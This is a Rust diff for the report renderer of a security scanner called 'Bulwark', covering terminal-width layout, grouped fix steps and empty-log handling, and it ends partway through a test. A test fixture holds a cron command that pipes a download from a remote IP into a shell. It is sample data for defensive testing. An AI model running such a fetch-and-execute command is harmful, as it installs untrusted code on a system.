@@ -20,9 +20,39 @@ pub struct ReportOptions {
     pub color: bool,
     /// What was scanned, for the header ("this computer", "web-1").
     pub target: String,
+    /// The terminal's width in columns. `None` when the report goes to a pipe or a file: then the
+    /// layout is the fixed one ([`TEXT_WIDTH`]), so a saved report does not depend on the window
+    /// it happened to be made in.
+    pub columns: Option<usize>,
+    /// Draw Bulwark's own symbols in ASCII (a locale that is not UTF-8).
+    pub ascii: bool,
 }
 
 impl ReportOptions {
+    /// The options for a report printed to this process's stdout: colour, width and symbols all
+    /// follow the terminal.
+    pub fn for_stdout(all: bool, target: impl Into<String>) -> Self {
+        Self {
+            all,
+            color: Self::color_for_stdout(),
+            target: target.into(),
+            columns: crate::term::stdout_columns(),
+            ascii: !crate::term::utf8_output(),
+        }
+    }
+
+    /// Width of the text column (everything under a problem's title). On a terminal it is what
+    /// fits beside the indent, never more than the fixed layout's width — long lines are no
+    /// easier to read on a wide screen — and never so little that words stop fitting.
+    fn text_width(&self) -> usize {
+        match self.columns {
+            Some(cols) => cols
+                .saturating_sub(INDENT + 1)
+                .clamp(MIN_TEXT_WIDTH, TEXT_WIDTH),
+            None => TEXT_WIDTH,
+        }
+    }
+
     /// Colour only on a real terminal, never with `NO_COLOR` set or `TERM=dumb`.
     pub fn color_for_stdout() -> bool {
         use std::io::IsTerminal;
@@ -228,7 +258,15 @@ impl Problem<'_> {
         if differs_mid_word {
             common.truncate(common.rfind(' ').unwrap_or(0));
         }
-        let trimmed = common.trim_end_matches([' ', ',', '-', '—']).trim_end();
+        // Nor on the word that led up to the place: "SSH brute-force from" (two source
+        // addresses) and "Key unprotected in" are sentences with their end missing.
+        let mut trimmed = common.trim_end_matches([' ', ',', '-', '—']).trim_end();
+        while let Some((rest, last)) = trimmed.rsplit_once(' ') {
+            if !LEAD_IN_WORDS.contains(&last.to_ascii_lowercase().as_str()) {
+                break;
+            }
+            trimmed = rest.trim_end_matches([' ', ',', '-', '—']);
+        }
         if trimmed.chars().count() >= 12 {
             return trimmed.to_string();
         }
@@ -238,6 +276,34 @@ impl Problem<'_> {
         // count the others.
         self.title_by_shared_ending()
             .unwrap_or_else(|| first.to_string())
+    }
+
+    /// The fix's first step. When the places' steps differ only by each place's own name ("add
+    /// 'install dccp /bin/true'", "add 'install sctp /bin/true'"), showing the first one under a
+    /// count of several tells the reader to fix one of them. The name is replaced by what it is
+    /// (`<module>`), which is the same instruction for every place listed below it. Steps that
+    /// differ in any other way are left as the first place's, as before.
+    fn fix_step(&self) -> String {
+        let first = first_step(self.items[0].fix_hint);
+        if self.items.iter().all(|i| first_step(i.fix_hint) == first) {
+            return first;
+        }
+        let general: Vec<String> = self
+            .items
+            .iter()
+            .map(|i| {
+                let mut step = first_step(i.fix_hint);
+                for (what, name) in place_names(&i.place) {
+                    step = replace_whole_word(&step, name, &format!("<{what}>"));
+                }
+                step
+            })
+            .collect();
+        if general.iter().all(|g| *g == general[0]) {
+            general[0].clone()
+        } else {
+            first
+        }
     }
 
     fn title_by_shared_ending(&self) -> Option<String> {
@@ -279,6 +345,50 @@ impl Problem<'_> {
     }
 }
 
+/// Words that lead up to a place at the end of a title. See [`Problem::title`].
+const LEAD_IN_WORDS: &[&str] = &[
+    "from", "in", "on", "at", "to", "for", "of", "by", "with", "the", "a", "an", "is", "and",
+];
+
+/// The names in a place that tell one finding from the next, with what each is: `module=dccp` →
+/// `("module", "dccp")`, a file → `("file", path)`. Places that are a port or a title have none.
+fn place_names(place: &str) -> Vec<(&str, &str)> {
+    let parts: Vec<(&str, &str)> = place
+        .split(" · ")
+        .filter_map(|part| part.split_once('='))
+        .filter(|(key, value)| {
+            !value.is_empty() && key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+        })
+        .collect();
+    if !parts.is_empty() {
+        return parts;
+    }
+    if looks_like_a_file(place) {
+        return vec![("file", place)];
+    }
+    Vec::new()
+}
+
+/// Replaces `word` in `text` where it stands on its own — "rds" is not replaced inside "words".
+fn replace_whole_word(text: &str, word: &str, with: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut rest = text;
+    while let Some(at) = rest.find(word) {
+        let before = rest[..at].chars().next_back();
+        let after = rest[at + word.len()..].chars().next();
+        let joined = |c: Option<char>| c.is_some_and(|c| c.is_alphanumeric() || c == '_');
+        out.push_str(&rest[..at]);
+        out.push_str(if joined(before) || joined(after) {
+            word
+        } else {
+            with
+        });
+        rest = &rest[at + word.len()..];
+    }
+    out.push_str(rest);
+    out
+}
+
 /// An explanation split into sentences, whitespace normalised. A sentence ends at `.`, `!` or `?`
 /// followed by a space or the end, so "0.0.0.0" and "v1.2" stay whole.
 fn sentences(text: &str) -> Vec<String> {
@@ -315,8 +425,14 @@ fn first_step(fix: &str) -> String {
     }
 }
 
-/// Body text column width: with the 13-column indent, lines stay under ~92 columns.
+/// Body text column width when the report is not going to a terminal, and the most it is ever
+/// given on one: with the 13-column indent, lines stay under ~92 columns.
 const TEXT_WIDTH: usize = 78;
+/// The indent of everything under a problem's title.
+const INDENT: usize = 13;
+/// The least the text column gets, however narrow the terminal: below this, words stop fitting
+/// and the lines wrap at the terminal's edge anyway.
+const MIN_TEXT_WIDTH: usize = 24;
 
 /// Word-wraps to `width` columns, at most `max_lines` lines (the last ends in "…" if cut).
 fn wrap(text: &str, width: usize, max_lines: usize) -> Vec<String> {
@@ -368,11 +484,11 @@ fn shows_place(item: &Item) -> bool {
 
 /// The places a problem was found, on one line that fits the text column: as many as fit (each
 /// cut from the start, so the file name survives), then "+N more".
-fn place_line(places: &[String]) -> String {
+fn place_line(places: &[String], text_width: usize) -> String {
     const LABEL: usize = 4; // "in: "
-    let budget = TEXT_WIDTH - LABEL;
+    let budget = text_width - LABEL;
     if places.len() == 1 {
-        return clip_start(&places[0], budget);
+        return clip_place(&places[0], budget);
     }
     let mut shown: Vec<String> = Vec::new();
     for (i, place) in places.iter().enumerate() {
@@ -386,7 +502,7 @@ fn place_line(places: &[String]) -> String {
         let room = budget.saturating_sub(used + more);
         // The first place always gets a readable width, whatever the "+N more" costs.
         let width = if shown.is_empty() { room.max(24) } else { room }.min(48);
-        let item = clip_start(place, width);
+        let item = clip_place(place, width);
         // Keep at least one place; after that, stop rather than show a place cut to nothing.
         if !shown.is_empty() && (room < 16 || item.chars().count() > room) {
             break;
@@ -401,7 +517,29 @@ fn place_line(places: &[String]) -> String {
     line
 }
 
-/// Like [`clip`] but keeps the end — for a path, the file name is the part worth seeing.
+/// A place cut to `max` columns without stopping inside a word. A path keeps its end (the file
+/// name is the part worth seeing); anything else — `source=/etc/crontab · command=…` — keeps its
+/// start, which says what it is, and ends on a whole word.
+fn clip_place(place: &str, max: usize) -> String {
+    if place.chars().count() <= max {
+        return place.to_string();
+    }
+    if looks_like_a_file(place) && !place.contains(' ') {
+        return clip_start(place, max);
+    }
+    let cut = clip(place, max);
+    let kept = cut.trim_end_matches('…');
+    match kept.rfind(' ') {
+        // Only when enough is left to still say something.
+        Some(i) if i >= max / 2 => {
+            format!("{}…", kept[..i].trim_end_matches([' ', '·', ',', '=']))
+        }
+        _ => cut,
+    }
+}
+
+/// Like [`clip`] but keeps the end — for a path, the file name is the part worth seeing. The cut
+/// lands on a folder boundary when there is one near, so the first name shown is a whole one.
 fn clip_start(s: &str, max: usize) -> String {
     let n = s.chars().count();
     if n <= max {
@@ -410,7 +548,14 @@ fn clip_start(s: &str, max: usize) -> String {
         String::new()
     } else {
         let tail: String = s.chars().skip(n - (max - 1)).collect();
-        format!("…{tail}")
+        let is_sep = |c: char| c == '/' || c == '\\';
+        let cut_before = s.chars().nth(n - max);
+        let mid_name = !cut_before.is_some_and(is_sep) && !tail.starts_with(is_sep);
+        match tail.find(is_sep) {
+            // Not if that would throw most of the room away on one long name.
+            Some(i) if mid_name && i <= tail.len() / 2 => format!("…{}", &tail[i..]),
+            _ => format!("…{tail}"),
+        }
     }
 }
 
@@ -477,6 +622,10 @@ struct Body<'a> {
 fn render_body(body: Body<'_>, opts: &ReportOptions) -> String {
     let st = Style { on: opts.color };
     let safe = crate::term_safe;
+    let width = opts.text_width();
+    // On a terminal, lines outside the text column are wrapped to its width too; into a pipe
+    // they stay whole, so a title or a footer line can be found with one `grep`.
+    let on_terminal = opts.columns.is_some();
     let mut out = String::new();
     let problems = &body.problems;
     let (main, minor): (Vec<&Problem>, Vec<&Problem>) = problems
@@ -484,12 +633,14 @@ fn render_body(body: Body<'_>, opts: &ReportOptions) -> String {
         .partition(|p| opts.all || p.severity >= Severity::Medium);
 
     // ---- header -----------------------------------------------------------------------------
-    let _ = writeln!(
-        out,
-        "{} {}",
-        st.bold(&format!("Bulwark {}", env!("CARGO_PKG_VERSION"))),
-        st.dim(&format!("· {}", safe(&body.subtitle)))
-    );
+    let name = format!("Bulwark {}", env!("CARGO_PKG_VERSION"));
+    let header = format!("{name} · {}", safe(&body.subtitle));
+    for (i, line) in footer_lines(&header, 0, opts).iter().enumerate() {
+        let _ = match line.strip_prefix(name.as_str()).filter(|_| i == 0) {
+            Some(rest) => writeln!(out, "{}{}", st.bold(&name), st.dim(rest)),
+            None => writeln!(out, "{}", st.dim(line)),
+        };
+    }
     let _ = writeln!(out);
 
     // ---- the list ---------------------------------------------------------------------------
@@ -513,12 +664,12 @@ fn render_body(body: Body<'_>, opts: &ReportOptions) -> String {
                 counts.push(st.severity(sev, &format!("{c} {}", sev_word(sev).to_lowercase())));
             }
         }
-        let _ = writeln!(
-            out,
-            "{}  {}",
-            st.bold(&format!("{n} {} to fix", plural(n, "problem", "problems"))),
-            counts.join(st.dim(" · ").as_str())
-        );
+        let heading = st.bold(&format!("{n} {} to fix", plural(n, "problem", "problems")));
+        let counts = counts.join(st.dim(" · ").as_str());
+        // One line into a pipe; on a terminal, as many lines as its width needs.
+        for line in footer_lines(&format!("{heading}  {counts}"), 0, opts) {
+            let _ = writeln!(out, "{}", line.trim_end());
+        }
         for p in &main {
             let times = if p.items.len() > 1 {
                 st.dim(&format!("  ×{}", p.items.len()))
@@ -526,24 +677,39 @@ fn render_body(body: Body<'_>, opts: &ReportOptions) -> String {
                 String::new()
             };
             let _ = writeln!(out);
-            let _ = writeln!(
-                out,
-                "  {} {:<8} {}{}",
-                st.severity(p.severity, "●"),
-                st.severity(p.severity, sev_word(p.severity)),
-                st.bold(&safe(&p.title())),
-                times
-            );
-            let pad = "             ";
+            let pad = " ".repeat(INDENT);
+            let title = safe(&p.title());
+            let title_lines = if on_terminal {
+                wrap(&title, width, usize::MAX)
+            } else {
+                vec![title]
+            };
+            let last = title_lines.len().saturating_sub(1);
+            for (i, line) in title_lines.iter().enumerate() {
+                let times = if i == last { times.as_str() } else { "" };
+                let _ = if i == 0 {
+                    writeln!(
+                        out,
+                        "  {} {} {}{}",
+                        st.severity(p.severity, "●"),
+                        // Padded before it is coloured: the colour codes are characters too, and
+                        // padding the coloured word left the title unaligned on every terminal.
+                        st.severity(p.severity, &format!("{:<8}", sev_word(p.severity))),
+                        st.bold(line),
+                        times
+                    )
+                } else {
+                    writeln!(out, "{pad}{}{}", st.bold(line), times)
+                };
+            }
             let max_lines = if opts.all { usize::MAX } else { 2 };
-            for line in wrap(&safe(&p.why()), TEXT_WIDTH, max_lines) {
+            for line in wrap(&safe(&p.why()), width, max_lines) {
                 let _ = writeln!(out, "{pad}{line}");
             }
-            let step = first_step(&safe(p.items[0].fix_hint));
-            for (i, line) in wrap(&step, TEXT_WIDTH - 2, max_lines)
-                .into_iter()
-                .enumerate()
-            {
+            // The step is picked out of the fix while it still has its lines; only then is it
+            // made safe to print as one.
+            let step = safe(&p.fix_step());
+            for (i, line) in wrap(&step, width - 2, max_lines).into_iter().enumerate() {
                 let arrow = if i == 0 {
                     st.green("→")
                 } else {
@@ -555,15 +721,23 @@ fn render_body(body: Body<'_>, opts: &ReportOptions) -> String {
             // first few on one line. A single place is shown too, unless the title already says it.
             if opts.all {
                 for item in &p.items {
+                    let evidence = item.evidence.filter(|e| !e.is_empty());
+                    // A finding about the machine as a whole has its title for a place, and the
+                    // title is already the line above.
+                    if item.place == item.title && evidence.is_none() {
+                        continue;
+                    }
                     let mut line = format!("· {}", safe(&item.place));
-                    if let Some(ev) = item.evidence.filter(|e| !e.is_empty()) {
+                    if let Some(ev) = evidence {
                         let _ = write!(line, "  {}", clip(&safe(ev), 60));
                     }
                     let _ = writeln!(out, "{pad}{}", st.dim(&line));
                 }
             } else if p.items.len() > 1 || shows_place(&p.items[0]) {
-                let places =
-                    place_line(&p.items.iter().map(|i| safe(&i.place)).collect::<Vec<_>>());
+                let places = place_line(
+                    &p.items.iter().map(|i| safe(&i.place)).collect::<Vec<_>>(),
+                    width,
+                );
                 let _ = writeln!(out, "{pad}{}", st.dim(&format!("in: {places}")));
             }
             // Built-in checks have a page with the full explanation and every fix step.
@@ -580,23 +754,25 @@ fn render_body(body: Body<'_>, opts: &ReportOptions) -> String {
         }
         if !minor.is_empty() {
             let _ = writeln!(out);
-            let _ = writeln!(
-                out,
-                "  {}",
-                st.dim(&format!(
-                    "and {} low-priority {} — run with --all to see {}",
-                    minor.len(),
-                    plural(minor.len(), "suggestion", "suggestions"),
-                    plural(minor.len(), "it", "them")
-                ))
+            let line = format!(
+                "and {} low-priority {} — run with --all to see {}",
+                minor.len(),
+                plural(minor.len(), "suggestion", "suggestions"),
+                plural(minor.len(), "it", "them")
             );
+            for line in footer_lines(&line, 2, opts) {
+                let _ = writeln!(out, "  {}", st.dim(&line));
+            }
         }
     }
 
     if !body.actions.is_empty() {
         let _ = writeln!(out);
         for a in &body.actions {
-            let _ = writeln!(out, "{} {a}", st.green("→"));
+            for (i, line) in footer_lines(a, 2, opts).iter().enumerate() {
+                let mark = if i == 0 { st.green("→") } else { " ".into() };
+                let _ = writeln!(out, "{mark} {line}");
+            }
         }
     }
 
@@ -604,10 +780,64 @@ fn render_body(body: Body<'_>, opts: &ReportOptions) -> String {
         let _ = writeln!(out);
         let _ = writeln!(out, "{}", st.dim("Not covered by this scan:"));
         for g in &body.gaps {
-            let _ = writeln!(out, "  {} {g}", st.dim("·"));
+            for (i, line) in footer_lines(g, 4, opts).iter().enumerate() {
+                let mark = if i == 0 { st.dim("·") } else { " ".into() };
+                let _ = writeln!(out, "  {mark} {line}");
+            }
         }
     }
+    if opts.ascii {
+        out = crate::term::ascii_symbols(&out);
+    }
     out
+}
+
+/// A line outside the text column (a footer note, a next step), wrapped to the terminal when
+/// there is one and left whole otherwise. `indent` is how far the caller indents it.
+fn footer_lines(text: &str, indent: usize, opts: &ReportOptions) -> Vec<String> {
+    let Some(cols) = opts.columns else {
+        return vec![text.to_string()];
+    };
+    let width = cols.saturating_sub(indent + 1).max(MIN_TEXT_WIDTH);
+    // Unlike `wrap`, a word longer than the line is never cut: these lines can carry colour
+    // codes and commands to copy, and half of either is worse than a line that runs over.
+    let mut lines: Vec<String> = Vec::new();
+    for word in text.split(' ') {
+        match lines.last_mut() {
+            Some(line) if visible_width(line) + 1 + visible_width(word) <= width => {
+                line.push(' ');
+                line.push_str(word);
+            }
+            _ => lines.push(word.to_string()),
+        }
+    }
+    lines
+}
+
+/// How many columns `s` takes on screen: its characters, without the colour codes among them.
+fn visible_width(s: &str) -> usize {
+    let mut width = 0;
+    let mut in_code = false;
+    for c in s.chars() {
+        match (in_code, c) {
+            (false, '\x1b') => in_code = true,
+            (false, _) => width += 1,
+            // A colour code ends at its letter ("\x1b[1;31m").
+            (true, c) if c.is_ascii_alphabetic() => in_code = false,
+            (true, _) => {}
+        }
+    }
+    width
+}
+
+/// What failed to load, named once: the engine reports a clashing id as "rule id MY-001", which
+/// under "rule … didn't load" read "rule rule id MY-001 didn't load".
+fn load_error_subject(kind: &str, path: &str) -> String {
+    let safe = crate::term_safe(path);
+    match safe.strip_prefix("rule id ") {
+        Some(id) => format!("{kind} {id}"),
+        None => format!("{kind} file {safe}"),
+    }
 }
 
 /// The host scan report (`bulwarkctl scan`). Pure, so it is tested without a terminal.
@@ -670,8 +900,8 @@ pub fn render(scan: &ScanRun, ignores: &Ignores, opts: &ReportOptions) -> String
     }
     for e in &scan.rule_load_errors {
         gaps.push(st.yellow(&format!(
-            "rule {} didn't load: {}",
-            safe(&e.path),
+            "{} didn't load: {}",
+            load_error_subject("rule", &e.path),
             clip(&safe(&e.message), 140)
         )));
     }
@@ -735,12 +965,38 @@ pub fn render_stored(
     )
 }
 
-/// A log scan that analyzed nothing: no decoders or rules, or input with no usable event (only
-/// unrecognisable lines, or a source that failed). Its empty result is no result.
-pub fn nothing_analyzed(scan: &bulwark_core::LogScanRun) -> bool {
-    scan.decoders_loaded == 0
-        || scan.rules_loaded == 0
-        || (scan.events_read == 0 && (scan.lines_unrecognized > 0 || !scan.read_errors.is_empty()))
+/// A log scan that analyzed nothing, and why, in a sentence — `None` when it did analyze
+/// something. Three cases, treated alike (no check mark, exit code 2), because "nothing found" is
+/// only a result when something was looked at:
+///
+///   * no decoders or no rules were loaded;
+///   * no log entry was read at all — an empty file, a journal that isn't there, a time range
+///     with nothing in it, or only lines that weren't log entries;
+///   * entries were read, and not one of them was of a kind Bulwark understands.
+///
+/// The second case used to print "0 events read … ✓ Nothing suspicious" and exit 0.
+pub fn nothing_analyzed_reason(scan: &bulwark_core::LogScanRun) -> Option<String> {
+    if scan.decoders_loaded == 0 || scan.rules_loaded == 0 {
+        return Some("The log checks could not be loaded, so nothing was checked.".into());
+    }
+    if scan.events_read == 0 {
+        return Some(
+            if scan.lines_unrecognized > 0 || !scan.read_errors.is_empty() {
+                "None of this input could be read as log entries, so nothing was checked."
+            } else {
+                "No log entries were read, so there is nothing to report on."
+            }
+            .into(),
+        );
+    }
+    if scan.events_decoded == 0 {
+        let n = scan.events_read as usize;
+        return Some(format!(
+            "{n} log {} read, but none of a kind Bulwark understands, so nothing was checked.",
+            plural(n, "entry was", "entries were")
+        ));
+    }
+    None
 }
 
 /// The log scan report (`bulwarkctl logs scan`). Each finding's place is what triggered it (the
@@ -781,8 +1037,8 @@ pub fn render_logs(scan: &bulwark_core::LogScanRun, opts: &ReportOptions) -> Str
     ] {
         for e in errs {
             gaps.push(st.yellow(&format!(
-                "{label} {} didn't load: {}",
-                safe(&e.path),
+                "{} didn't load: {}",
+                load_error_subject(label, &e.path),
                 clip(&safe(&e.message), 140)
             )));
         }
@@ -806,6 +1062,24 @@ pub fn render_logs(scan: &bulwark_core::LogScanRun, opts: &ReportOptions) -> Str
     for e in &scan.rule_eval_errors {
         gaps.push(st.yellow(&clip(&safe(e), 160)));
     }
+    let not_analyzed = nothing_analyzed_reason(scan);
+    // What to do about it, unless a warning from the scan already says.
+    let mut actions = Vec::new();
+    if not_analyzed.is_some() && scan.warnings.is_empty() && scan.rules_loaded > 0 {
+        actions.push(if scan.events_read == 0 {
+            format!(
+                "Check that the file has log entries in it, or that this system keeps a journal \
+                 ({} shows it). {} reads a log file instead.",
+                st.bold("journalctl -b"),
+                st.bold("--from-file /var/log/auth.log")
+            )
+        } else {
+            format!(
+                "Bulwark reads sign-in, sudo and similar entries: {} lists the kinds it knows.",
+                st.bold("bulwarkctl logs decoders list")
+            )
+        });
+    }
 
     render_body(
         Body {
@@ -816,12 +1090,11 @@ pub fn render_logs(scan: &bulwark_core::LogScanRun, opts: &ReportOptions) -> Str
                 scan.events_decoded
             ),
             problems: group(items),
-            clean: if nothing_analyzed(scan) {
-                Err("Couldn't analyze this input — see below.")
-            } else {
-                Ok("Nothing suspicious in the events read.")
+            clean: match &not_analyzed {
+                Some(why) => Err(why.as_str()),
+                None => Ok("Nothing suspicious in the events read."),
             },
-            actions: Vec::new(),
+            actions,
             gaps,
         },
         opts,
@@ -975,6 +1248,8 @@ mod tests {
             all,
             color: false,
             target: "this computer".into(),
+            columns: None,
+            ascii: false,
         }
     }
 
@@ -1105,9 +1380,17 @@ mod tests {
             ),
             "Module not blacklisted"
         );
+        // Cut back to a whole word, and not left hanging on the word that led up to the place.
         assert_eq!(
             t("Key unprotected in alpha", "Key unprotected in alpine"),
-            "Key unprotected in"
+            "Key unprotected"
+        );
+        assert_eq!(
+            t(
+                "SSH brute-force from 203.0.113.9",
+                "SSH brute-force from 198.51.100.7"
+            ),
+            "SSH brute-force"
         );
         assert_eq!(t("Same", "Same"), "Same");
     }
@@ -1337,7 +1620,7 @@ mod tests {
                 )
             })
             .collect();
-        let line = place_line(&long);
+        let line = place_line(&long, TEXT_WIDTH);
         assert!(line.chars().count() <= TEXT_WIDTH - 4, "{line}");
         assert!(
             line.contains(".jsonl:1131") && line.ends_with("more"),
@@ -1347,7 +1630,7 @@ mod tests {
         let many: Vec<String> = (0..100_000)
             .map(|i| format!("/a/very/long/path/number/{i}/file.jsonl"))
             .collect();
-        let line = place_line(&many);
+        let line = place_line(&many, TEXT_WIDTH);
         assert!(
             line.contains("file.jsonl") && line.chars().count() <= TEXT_WIDTH - 4,
             "{line}"
@@ -1357,7 +1640,10 @@ mod tests {
         let short: Vec<String> = ["port 1", "port 2", "port 3", "port 4"]
             .map(String::from)
             .to_vec();
-        assert_eq!(place_line(&short), "port 1, port 2, port 3, port 4");
+        assert_eq!(
+            place_line(&short, TEXT_WIDTH),
+            "port 1, port 2, port 3, port 4"
+        );
     }
 
     #[test]
@@ -1385,14 +1671,17 @@ mod tests {
     #[test]
     fn a_log_scan_that_read_nothing_usable_draws_no_checkmark() {
         let bad = log_scan(0, 5);
-        assert!(nothing_analyzed(&bad));
+        assert!(nothing_analyzed_reason(&bad).is_some());
         let r = render_logs(&bad, &opts(false));
-        assert!(r.contains("! Couldn't analyze this input"), "{r}");
+        assert!(
+            r.contains("! None of this input could be read as log entries"),
+            "{r}"
+        );
         assert!(!r.contains('✓'), "{r}");
         assert!(r.contains("nothing was analyzed"), "{r}");
 
         let ok = log_scan(120, 3);
-        assert!(!nothing_analyzed(&ok));
+        assert!(nothing_analyzed_reason(&ok).is_none());
         let r = render_logs(&ok, &opts(false));
         assert!(
             r.contains("✓ Nothing suspicious in the events read."),
@@ -1403,6 +1692,44 @@ mod tests {
             "{r}"
         );
         assert!(r.contains("120 events read"), "{r}");
+    }
+
+    /// The tester's case: an empty `--from-file`, or a journal that isn't there, printed
+    /// "0 events read … ✓ Nothing suspicious" and exited 0. Nothing read is not a clean log.
+    #[test]
+    fn a_log_scan_of_empty_input_is_not_a_clean_result() {
+        let empty = log_scan(0, 0);
+        let why = nothing_analyzed_reason(&empty).expect("empty input analyzed nothing");
+        assert!(why.contains("No log entries were read"), "{why}");
+        let r = render_logs(&empty, &opts(false));
+        assert!(!r.contains('✓') && !r.contains("Nothing suspicious"), "{r}");
+        assert!(r.contains("! No log entries were read"), "{r}");
+        // …and it says what to check, since no warning from the scan does.
+        assert!(
+            r.contains("journalctl -b") && r.contains("--from-file"),
+            "{r}"
+        );
+    }
+
+    /// Entries were read and none was of a kind Bulwark knows (a kernel-only log, say): the rules
+    /// had nothing to look at, so there is no check mark either.
+    #[test]
+    fn a_log_scan_that_understood_no_entry_is_not_a_clean_result() {
+        let mut scan = log_scan(500, 0);
+        scan.events_decoded = 0;
+        let why = nothing_analyzed_reason(&scan).expect("nothing was understood");
+        assert!(why.contains("500 log entries were read"), "{why}");
+        let r = render_logs(&scan, &opts(false));
+        assert!(!r.contains('✓') && !r.contains("Nothing suspicious"), "{r}");
+        assert!(r.contains("bulwarkctl logs decoders list"), "{r}");
+
+        // One entry understood is enough for the result to mean something.
+        scan.events_decoded = 1;
+        assert!(nothing_analyzed_reason(&scan).is_none());
+        assert!(render_logs(&scan, &opts(false)).contains('✓'));
+        // No decoders or rules at all is the third case, as before.
+        scan.rules_loaded = 0;
+        assert!(nothing_analyzed_reason(&scan).is_some());
     }
 
     #[test]
@@ -1441,5 +1768,266 @@ mod tests {
         let mut o = opts(false);
         o.color = true;
         assert!(render(&s, &Ignores::default(), &o).contains("\x1b[1;31m"));
+    }
+
+    /// A monitored machine answered with a title holding a newline and a right-to-left override,
+    /// and got a line of its own in the report. Every field is one line now, whatever is in it.
+    #[test]
+    fn a_hostile_machine_cannot_add_lines_to_the_report() {
+        let mut f = finding(
+            "BLWK-X-001",
+            Severity::High,
+            "Real title\nCRITICAL: all clear, nothing to fix\r\u{202e}txt.exe\u{200b}",
+            "/x\n  ✓ Nothing to fix from the checks that ran.",
+        );
+        f.explanation = "First.\nINJECTED LINE\u{202e} second.".into();
+        let mut s = scan(vec![f]);
+        s.collector_errors = serde_json::from_value(json!([
+            {"collector": "c", "message": "boom\nNot covered by this scan: nothing", "skipped": false}
+        ]))
+        .unwrap();
+        for all in [false, true] {
+            let r = render(&s, &Ignores::default(), &opts(all));
+            for line in r.lines() {
+                let line = line.trim_start();
+                assert!(!line.starts_with("CRITICAL: all clear"), "{r}");
+                assert!(!line.starts_with("INJECTED"), "{r}");
+                assert!(!line.starts_with("✓"), "{r}");
+                assert!(
+                    !line.starts_with("Not covered by this scan: nothing"),
+                    "{r}"
+                );
+            }
+            assert!(!r.contains('\r') && !r.contains('\u{202e}') && !r.contains('\u{200b}'));
+            // The text is still there, on the line it belongs to.
+            assert!(r.contains("Real title CRITICAL: all clear"), "{r}");
+        }
+    }
+
+    /// Bulwark's own fix hints run over several lines; the first step is still picked out, and
+    /// a line break inside a hostile "step" cannot become a line of the report.
+    #[test]
+    fn a_multi_line_fix_still_shows_its_first_step() {
+        let mut f = finding("BLWK-SSH-012", Severity::High, "t", "/k/a");
+        f.fix_hint =
+            "\n1. Add a passphrase: ssh-keygen -p -f <key>\n2. Then something else.".into();
+        let r = render(&scan(vec![f]), &Ignores::default(), &opts(false));
+        assert!(
+            r.contains("→ Add a passphrase: ssh-keygen -p -f <key>"),
+            "{r}"
+        );
+        assert!(!r.contains("Then something else"), "{r}");
+    }
+
+    /// The grouped kernel-module problem showed the first module's command under "×4".
+    #[test]
+    fn a_grouped_fix_names_what_differs_instead_of_one_place() {
+        let module = |name: &str| {
+            let mut f = finding(
+                "BLWK-KERNEL-020",
+                Severity::Medium,
+                "Module not blacklisted",
+                "",
+            );
+            f.title = format!("Kernel module not blacklisted: {name}");
+            f.context = serde_json::from_value(json!({ "module": name })).unwrap();
+            f.fix_hint = format!(
+                "If '{name}' isn't actually needed on this host, add 'install {name} /bin/true' to a file under /etc/modprobe.d/."
+            );
+            f
+        };
+        let s = scan(vec![module("dccp"), module("sctp"), module("rds")]);
+        let r = render(&s, &Ignores::default(), &opts(true));
+        assert!(
+            r.contains("If '<module>' isn't actually needed on this host, add 'install <module>"),
+            "{r}"
+        );
+        assert!(!r.contains("install dccp"), "{r}");
+        assert!(
+            r.contains("· module=dccp") && r.contains("· module=rds"),
+            "{r}"
+        );
+
+        // One place keeps its own command, and steps that differ for another reason are left be.
+        let one = render(
+            &scan(vec![module("dccp")]),
+            &Ignores::default(),
+            &opts(false),
+        );
+        assert!(one.contains("install dccp /bin/true"), "{one}");
+        assert_eq!(
+            replace_whole_word("words and rds", "rds", "<m>"),
+            "words and <m>"
+        );
+        assert_eq!(
+            place_names("source=/etc/crontab · line=3"),
+            [("source", "/etc/crontab"), ("line", "3")]
+        );
+        assert_eq!(place_names("/home/u/.npmrc"), [("file", "/home/u/.npmrc")]);
+        assert!(place_names("port 22 on 0.0.0.0").is_empty());
+    }
+
+    /// `--all` listed "· auditd is not installed" under the title "auditd is not installed".
+    #[test]
+    fn a_whole_machine_finding_is_not_listed_as_its_own_place() {
+        let mut f = finding(
+            "BLWK-LOG-001",
+            Severity::Medium,
+            "auditd is not installed",
+            "",
+        );
+        f.context = Default::default();
+        let r = render(&scan(vec![f]), &Ignores::default(), &opts(true));
+        assert_eq!(r.matches("auditd is not installed").count(), 1, "{r}");
+        assert!(!r.contains("· auditd"), "{r}");
+    }
+
+    /// A place that is not a path is cut at its end, on a whole word; a path keeps its file name
+    /// and starts at a whole folder name.
+    #[test]
+    fn a_long_place_is_never_cut_inside_a_word() {
+        let cron =
+            "source=/var/spool/cron/crontabs/root · command=curl http://203.0.113.9/a | sh -s";
+        let cut = clip_place(cron, 48);
+        assert!(cut.chars().count() <= 48, "{cut}");
+        assert!(
+            cut.starts_with("source=/var/spool/cron/crontabs/root"),
+            "{cut}"
+        );
+        assert!(cut.ends_with('…'), "{cut}");
+        let kept = cut.trim_end_matches('…');
+        assert!(
+            cron[kept.len()..].starts_with(' '),
+            "the cut must fall between words: {cut:?}"
+        );
+        assert_eq!(clip_place("short", 48), "short");
+
+        let path = "/home/someone/projects/a-long-project/config/settings.json";
+        let cut = clip_place(path, 30);
+        assert!(cut.chars().count() <= 30, "{cut}");
+        assert!(
+            cut.starts_with("…/") && cut.ends_with("/settings.json"),
+            "{cut}"
+        );
+    }
+
+    #[test]
+    fn a_load_error_names_the_rule_once() {
+        let mut s = scan(vec![]);
+        s.rule_load_errors = serde_json::from_value(json!([
+            {"path": "rule id MY-001", "message": "duplicate rule id 'MY-001'"},
+            {"path": "/r/broken.yaml", "message": "did not find expected node"},
+        ]))
+        .unwrap();
+        let r = render(&s, &Ignores::default(), &opts(false));
+        assert!(r.contains("rule MY-001 didn't load: duplicate"), "{r}");
+        assert!(!r.contains("rule rule"), "{r}");
+        assert!(r.contains("rule file /r/broken.yaml didn't load"), "{r}");
+    }
+
+    /// The report was laid out for ~93 columns whatever the terminal. On a terminal it now fits
+    /// the width it has, down to a floor; into a pipe it is laid out as before.
+    #[test]
+    fn the_report_fits_the_terminal_it_is_printed_on() {
+        let mut f = finding(
+            "BLWK-SSH-012",
+            Severity::High,
+            "SSH private key is not protected by a passphrase on this computer",
+            "/home/u/.ssh/id_ed25519",
+        );
+        f.rule_id = "MY-1".into(); // no "more:" link, which is one unbreakable URL
+                                   // One problem of every severity, so the summary line is a long one too.
+        let mut all = vec![f];
+        for (id, sev) in [
